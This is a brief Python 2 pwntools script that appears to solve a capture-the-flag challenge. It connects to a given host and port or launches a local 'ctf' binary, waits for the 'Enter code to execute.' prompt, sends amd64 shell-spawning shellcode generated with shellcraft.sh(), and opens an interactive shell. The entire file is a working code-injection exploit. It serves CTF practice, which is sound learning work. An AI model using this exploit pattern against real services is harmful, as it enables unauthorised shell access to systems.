#!/usr/bin/env python2

from pwn import *

# Setup goodies
context(os = 'linux', arch = 'amd64')

# Demo should work even without a HOST
if 'HOST' in args:
    r = remote(args['HOST'], int(args['PORT']))
else:
     r = process('../../games/1/ctf')

r.recvuntil("Enter code to execute.")

r.sendline(flat(asm(shellcraft.sh())))

r.clean()
r.interactive()

